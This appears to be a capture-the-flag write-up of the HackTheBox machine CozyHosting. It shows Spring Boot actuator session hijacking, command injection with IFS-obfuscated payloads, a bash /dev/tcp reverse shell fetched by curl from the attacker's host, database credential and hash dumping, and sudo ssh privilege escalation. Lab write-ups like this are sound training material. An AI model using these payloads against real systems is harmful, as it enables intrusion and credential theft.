---
Platform:
  - HackTheBox
Difficulty: Easy
tags:
  - command-injection
  - sudo-privesc
Status: Rooted/Finished
Blog Posting: Not Posted
Type: Machine
---
Hello everyone, In this blog we are going to solve CozyHosting from HackTheBox.

Link for the machine : [https://app.hackthebox.com/machines/CozyHosting](https://app.hackthebox.com/machines/CozyHosting)

  

Lets Start 🙌

  

Connect to the HTB server by using the OpenVpn configuration file that’s generated by HTB.

[ [Click Here](https://help.hackthebox.com/en/articles/5185687-introduction-to-lab-access) to learn more about how to connect to vpn and access the boxes. ]

After connecting to the vpn service, click on Join Machine to access the machine’s ip.

After joining the machine you can see the IP Address of the target machine.

  

First I started by scanning for open ports on the target machine.

![[CozyHosting/assets/Untitled.png|Untitled.png]]

![[CozyHosting/assets/Untitled 1.png|Untitled 1.png]]

From the results, we can see that 2 ports are open.

|**Ports**|**Services**|
|---|---|
|22|SSH|
|80|HTTP|

First I checked the HTTP service, by trying to visit the website that is hosted on port 80.

![[CozyHosting/assets/2023-10-08_12-25.png]]

We can see that the website redirects to a domain `cozyhosting.htb`. We have to add this domain referring to the target IP address in our `/etc/hosts` file, to view this website.

![[CozyHosting/assets/Untitled 2.png|Untitled 2.png]]

Now visit the website.

![[CozyHosting/assets/Untitled 3.png|Untitled 3.png]]

![[CozyHosting/assets/Untitled 4.png|Untitled 4.png]]

The website, has a login page. Nothing else interesting. So next I started directory enumeration using `gobuster`.

![[CozyHosting/assets/Untitled 5.png|Untitled 5.png]]

From the results of the `gobuster`, we have found two routes, `/admin` and `/error`. I first checked the `/admin` route. The `/admin` route redirects to `/login` route, which means we have to first login to view the admin page.

  

So next I visited the `/error` route.

![[CozyHosting/assets/Untitled 6.png|Untitled 6.png]]

The error page displayed the message “Whitelabel Error Page”. I googled about this and found that this is a spring boot error page.

![[CozyHosting/assets/Untitled 7.png|Untitled 7.png]]

Now we know that the website is built with Spring Boot. So I started looking out for common spring boot vulnerabilities. I found this [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators), So I started to take a look at the documentation of spring boot for these actuator endpoints [https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints](https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints) and checked all the endpoints.

Out of all the endpoints, `/actuator/env`, `/actuator/sessions`, and `/actuator/mappings` endpoints worked.

![[CozyHosting/assets/Untitled 8.png|Untitled 8.png]]

![[CozyHosting/assets/Untitled 9.png|Untitled 9.png]]

![[CozyHosting/assets/Untitled 10.png|Untitled 10.png]]

From the `/actuator/sessions` endpoint, found the following session tokens.

```
"DCA90484E0BC1EC72DE193954E4BC7A1":"kanderson"
```

I tried to login with these session tokens. I used the cookie editor to replace the current session ID with the token we found.

![[CozyHosting/assets/Untitled 11.png|Untitled 11.png]]

Now refresh the page.

![[CozyHosting/assets/Untitled 12.png|Untitled 12.png]]

And we have successfully got access to the admin page.

In the admin page, you can see a form, which on submit will try to establish a connection via ssh using the given hostname and username.

![[CozyHosting/assets/Untitled 13.png|Untitled 13.png]]

First I tried some random host name and captured the request with burpsuite and sent that to the repeater tab. While I was testing with random credentials, when supplying an empty username, resulted in the following error.

![[CozyHosting/assets/Untitled 14.png|Untitled 14.png]]

From this error we can device that this API is vulnerable to command injection. So I tried some basic command to test it.

![[CozyHosting/assets/Untitled 15.png|Untitled 15.png]]

From the response, we can see the response of the id command and now its proved that the application is vulnerable to command injection. Now its time to use this vulnerability to gain access to the machine.

  

We know that, we can execute commands on the target machine with this vulnerability, so we can download a reverse shell on the target machine by sending command. For that first we need a reverse shell on our local machine. Create a file named `revshell.sh` and paste following code in that file. Don’t forget to replace the IP address.

```
#! /bin/bash

bash -i >& /dev/tcp/<Your_HTB_tunnel_IP>/9001 0>&1
```

Now start a simple HTTP server with python using the command `python3 -m http.server`.

![[CozyHosting/assets/Untitled 16.png|Untitled 16.png]]

Now its time to download this reverse shell on the target machine. You can use this below command to download the reverse shell on the target machine by supplying this as the value to the username field.

```
$(IFS=_;command='curl_http://<Your_HTB_Tunnel_IP>:8000/revshell.sh_--output_/tmp/revshell.sh';$command;)
```

> [!important]  
> I have used a variable IFS in the above command. To know about it, check this out: https://www.youtube.com/watch?v=so8IRuhWjEM  

![[CozyHosting/assets/Untitled 17.png|Untitled 17.png]]

From the response we can see that there is no error thrown. We can verify that the reverse shell is downloaded on the target machine by checking the terminal where we hosted the simple HTTP server using python. You will be able to see a GET request to `/revshell.sh`, which shows that the file is downloaded successfully.

![[CozyHosting/assets/Untitled 18.png|Untitled 18.png]]

Next we have to provide executable permission to the reverse shell file to execute it. You can do this by supplying the following command.

```
$(IFS=_;command='chmod_777_/tmp/revshell.sh';$command;)
```

![[CozyHosting/assets/Untitled 19.png|Untitled 19.png]]

No error from the response and thus we have successfully updated the file permissions. Now its time to execute the reverse shell. But before that we have to start a `netcat` listener on our local machine on port `9001`.

![[CozyHosting/assets/Untitled 20.png|Untitled 20.png]]

Finally, its time to execute the reverse shell, supply the following command to do so.

```
$(IFS=_;command='/tmp/revshell.sh';$command;)
```

![[CozyHosting/assets/Untitled 21.png|Untitled 21.png]]

No error and no response, check the `netcat` listener. We have successfully got the reverse shell back.

![[CozyHosting/assets/Untitled 22.png|Untitled 22.png]]

When I listed the contents of the directory on the target machine, found a jar file.

![[CozyHosting/assets/Untitled 23.png|Untitled 23.png]]

I downloaded the file to the local machine by starting a http server using python on the target machine.

![[CozyHosting/assets/Untitled 24.png|Untitled 24.png]]

![[CozyHosting/assets/Untitled 25.png|Untitled 25.png]]

  

After downloading, I used the `jadx-gui` [ [https://github.com/skylot/jadx](https://github.com/skylot/jadx) ] tool to decompile and view the contents of the jar file.

![[CozyHosting/assets/Untitled 26.png|Untitled 26.png]]

While surfing the contents of the jar file, found the credentials for postgres database from the `application.properties` file.

Let’s try to see the contents of the database from the target machine using the found credentials.

Before doing that let’s upgrade our shell that we got back from our reverse shell to a more stable shell using the command: `python3 -c 'import pty; pty.spawn("/bin/bash")'`

After upgrading our shell run the following command to connect to postgres database. Check here to know more about postsgresql commands: [https://www.commandprompt.com/education/postgresql-basic-psql-commands/?source=post_page-----3db77d07bc06--------------------------------](https://www.commandprompt.com/education/postgresql-basic-psql-commands/?source=post_page-----3db77d07bc06--------------------------------)

```
# SYNTAX
psql "postgresql://$DB_USER:$DB_PWD@$DB_SERVER/$DB_NAME" 
# Command
psql "postgresql://postgres:Vg&nvzAQ7XxR@localhost/cozyhosting"
```

![[CozyHosting/assets/Untitled 27.png|Untitled 27.png]]

After surfing the database for sometime, found these password hashes

|   |   |   |
|---|---|---|
|Username|Hash|Role|
|kanderson|$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim|User|
|admin|$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm|Admin|

First let’s try to crack the admin password. First create a file named `hash.txt` and store the admin hash to the `hash.txt` file. Next use the `hashid` tool to identify the hash type.

![[CozyHosting/assets/Untitled 28.png|Untitled 28.png]]

Now we have found the hash type and `hashcat` mode. It’s time to crack the password.

![[CozyHosting/assets/Untitled 29.png|Untitled 29.png]]

![[CozyHosting/assets/Untitled 30.png|Untitled 30.png]]

I wasn’t able crack the hash of the user `kanderson`. So I decided to move on.

I checked the `/etc/passwd` file for other users on the target machine using the `netcat` session that we got back from our reverse shell.

![[CozyHosting/assets/Untitled 31.png|Untitled 31.png]]

Found another user named `josh`. I tried to switch user as `josh` using the credential that we found. I was able to switch user and as well as I found the flag.

![[CozyHosting/assets/Untitled 32.png|Untitled 32.png]]

Now it’s time to escalate our privileges. Since we know the password for `josh`, I exited .the session that we got from reverse shell and logged in via SSH

![[CozyHosting/assets/Untitled 33.png|Untitled 33.png]]

I was looking out for some common privilege escalation vectors. I checked for `sudo -l`.

![[CozyHosting/assets/Untitled 34.png|Untitled 34.png]]

From the output of the `sudo -l` command, we can see that the user `josh` can run the command `ssh` as `sudo`. I checked gtfobins for this and found this: [https://gtfobins.github.io/gtfobins/ssh/#sudo](https://gtfobins.github.io/gtfobins/ssh/#sudo)

![[CozyHosting/assets/Untitled 35.png|Untitled 35.png]]

Using the above command, I got escalated my privileges as root and found the root flag successfully.

![[CozyHosting/assets/Untitled 36.png|Untitled 36.png]]

  

Thank You !!!!!!